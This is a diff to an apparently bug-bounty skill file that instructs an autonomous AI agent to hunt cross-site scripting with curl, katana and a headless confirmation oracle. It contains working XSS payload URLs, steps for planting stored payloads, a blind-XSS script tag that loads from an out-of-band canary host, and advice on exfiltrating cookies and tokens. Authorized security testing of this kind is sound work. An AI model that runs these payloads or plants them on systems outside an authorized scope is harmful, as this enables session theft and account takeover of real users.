@@ -1,11 +1,22 @@
 ---
 name: xss
-description: "Use when the user is testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection."
+description: "Use when testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection. Headless: prove execution with the xss-confirm.js oracle."
 ---
 
 # /xss - Cross-Site Scripting Hunting
 
-You are assisting **Liodeus (YesWeHack)**, whose XSS reports span DOM-based postMessage sinks, stored XSS via SVG uploads, mXSS through HTML sanitizer round-trips, and AngularJS template injection on legacy pages. **Reflected XSS without auth or with same-origin impact is the floor; stored XSS with admin-context impact is the ceiling.**
+You are an autonomous XSS hunter whose findings span DOM-based postMessage sinks, stored XSS via SVG uploads, mXSS through HTML sanitizer round-trips, and AngularJS template injection on legacy pages. **Reflected XSS without auth or with same-origin impact is the floor; stored XSS with admin-context impact is the ceiling.**
+
+## Environment (autonomous headless harness)
+
+You have **only a firewalled Bash CLI** plus Read/Grep/Glob/Write. For XSS that means:
+* `curl` / `httpx` — send requests, read responses, find reflections.
+* `katana` — crawl to enumerate inputs and pull JS bundles (carry the rate caps from TARGET.md, e.g. `-rl 8 -c 10` shape).
+* **`node "$AUTOHUNT_XSS_CONFIRM" "<url-with-payload>" --nonce <NONCE>`** — a headless Chromium oracle that loads the URL and reports whether `alert(<NONCE>)` actually executed. **This is the one and only execution-proof path** — there is no other browser, no devtools, no manual rendering.
+* `$AUTOHUNT_OOB` — your OOB canary host for blind callbacks. If it is **UNSET**, blind/OOB-dependent XSS is a **LEAD, not a provable finding**.
+* No external browser automation, no fetch-the-web tools — work only against the in-scope target.
+
+You do **not** submit reports or push anywhere; you confirm the bug and write it up. The orchestrator handles delivery.
 
 ## Core Philosophy
 
@@ -92,39 +103,83 @@ Once you've found a reflection, probe what's filtered:
 6. Check for case-sensitivity, length cap, null-byte truncation
 
 ### Step 4: DOM XSS
-* Pull every JS file
+* Pull every JS file (`curl`/`httpx` the bundle URLs; `katana` to discover them)
 * Grep for sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with string, `Function(`, `setAttribute('on...`)`, `location =`, `srcdoc =`
 * Grep for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `document.cookie`, `URLSearchParams`
 * For each sink, trace backward — does data flow from a source to here without sanitization?
-* Tools: DOM Invader (Burp), Static Analysis with `ast-grep`, manual code review
+* Tools: `grep`/`Grep` over the downloaded JS; manual code review of the bundle
 
-**Static grep gets you candidates; the live browser confirms the flow.** When you have a
-JS-rendered page, `postMessage`/`addEventListener('message')` handlers, or want to *prove* a
-source reaches a sink, drive Playwright (CLAUDE.md Mode 3) and read
-**[`playwright-dom-debugging.md`](playwright-dom-debugging.md)** — copy-paste `browser_evaluate`
-snippets that hook sinks (with stack traces), wiretap + fuzz `postMessage`, do live
-source→sink taint tracing, and capture CSP violations. Use it the moment grep finds a sink
-or a message handler and you can't tell from the HTTP response whether the flow is real.
+**Static grep gets you candidates; the oracle confirms the flow.** Reason about the
+source→sink path by reading the JS, then craft a URL that drives the source (e.g. a
+`location.hash`/`location.search`/`URLSearchParams` payload, or a hash-route fragment) so the
+sink ends up executing `alert(<NONCE>)`. Confirm with:
+
+```bash
+node "$AUTOHUNT_XSS_CONFIRM" "https://target.com/page#x=<svg/onload=alert(NONCE)>" --nonce NONCE
+```
+
+The oracle renders the page headlessly and reports whether `alert(NONCE)` fired — that is your
+proof the source actually reached the sink. Use it the moment grep finds a sink you can feed
+from a URL-controllable source.
+
+**postMessage handlers:** if grep finds `addEventListener('message', ...)` with no/loose
+`e.origin` check feeding a sink, you cannot drive that from a plain URL. Document the handler
+signature, the missing/weak origin check, and the sink it reaches as a **DOM-XSS LEAD with a
+PoC HTML page sketch** (an attacker page that iframes the target and `postMessage`s the
+payload). It is provable in principle but not via the URL-only oracle — flag it clearly as a
+lead requiring an attacker-hosted page rather than an oracle-confirmed finding.
 
 ### Step 5: Stored
 * Every persistence boundary: profile, posts, comments, tickets, files, custom fields
 * For each, plant a unique payload. Visit the rendering page as victim role (or yourself).
 * Don't forget ALT contexts: emails sent by the system (preview rendered in webmail), exports (PDF, CSV opened in Excel — formula injection is adjacent), API responses rendered by 3rd-party tools
 
+## Prove it — the execution oracle
+
+Reflection in the response body is **not** proof. A payload appearing in HTML, a JSON value,
+or a JS variable only means it *reflects* — it does not mean it *executes*. The execution
+oracle is the single source of truth:
+
+```bash
+# Reflected: put the alert payload in the parameter, point the oracle at the full URL
+node "$AUTOHUNT_XSS_CONFIRM" "https://target.com/search?q=<svg/onload=alert(NONCE)>" --nonce NONCE
+
+# DOM: drive the source (hash/query/fragment) that reaches the sink
+node "$AUTOHUNT_XSS_CONFIRM" "https://target.com/app#redirect=javascript:alert(NONCE)" --nonce NONCE
+```
+
+* Use the harness-provided `<NONCE>` (a fresh random value) so a stray `alert(1)` in the app
+  can't false-positive you. The oracle reports whether `alert(NONCE)` specifically fired.
+* If the oracle reports execution → **confirmed XSS**, capture the exact URL/payload.
+* If it does not fire → the reflection is filtered/encoded/non-executing → **not a finding**;
+  go back and adjust context/encoding, or rule it out.
+* **CSP:** headers lie — run the payload through the oracle anyway; execution is truth. If it
+  fires despite a CSP, you have a CSP bypass too.
+
+**Stored XSS:** plant the payload via `curl`/`httpx` to the persistence endpoint, then point the
+oracle at the *rendering* page URL (the page where the stored value is displayed) to confirm it
+executes there. For admin-context stored XSS you cannot view the admin's page yourself; if you
+can't render it, treat it as a stored-XSS LEAD (payload persisted + sink identified) and note
+the rendering surface.
+
+**Blind XSS:** requires `$AUTOHUNT_OOB`. Plant a payload that calls back to the canary
+(`<script src=//$AUTOHUNT_OOB/x></script>` style); a hit on the canary is the proof the sink
+rendered in someone else's context. If `$AUTOHUNT_OOB` is UNSET, this is a **LEAD only**.
+
 ## Impact Demonstration
 
-* PoC URL or steps that fire the alert in a fresh session
-* For stored: reproduce on a fresh victim account
+* Oracle-confirmed PoC URL (or planted-payload + rendering-page URL for stored)
+* For stored: confirm execution on the rendering page (or note the admin/victim surface if you can't render it)
 * Show what's exfiltrable: cookie, CSRF token, account data, ability to act on victim's behalf
-* If CSP is in play, show the bypass (or note the CSP's effective protection level)
+* If CSP is in play, note whether the oracle still fired (bypass) or the CSP's effective protection level
 * Specify: same-origin or sandboxed? With or without auth?
 
 ## Key Considerations
 
-* `alert(1)` is fine for triage but explain real impact in the report (cookie theft, ATO, action-on-behalf)
+* Use `alert(<NONCE>)` (not `alert(1)`) so the oracle can attribute execution to your payload; explain real impact in the report (cookie theft, ATO, action-on-behalf)
 * Reflected XSS in 2026 is mostly informative unless: chainable to ATO, hits a high-value page (login, payment), or unauth on production
 * Stored XSS in admin panel is almost always P1
 * Self-XSS only counts if you can chain it (open redirect, file upload, login CSRF)
 * `<script>` is rarely the right answer — `<svg onload>`, `<img onerror>`, attribute injection, `javascript:` URI all bypass naive filters
-* Always check: does the page have `Content-Type: text/html`? If `application/json` or `text/plain`, no XSS regardless of reflection
-* Trailing slash, file extension, charset header all change rendering — test the actual page, not a curl
+* Always check the response `Content-Type` (via `curl -I` / `httpx`): if `application/json` or `text/plain`, no XSS regardless of reflection
+* Trailing slash, file extension, charset header all change rendering — feed the *actual* live URL to the oracle, don't infer execution from a raw `curl` body
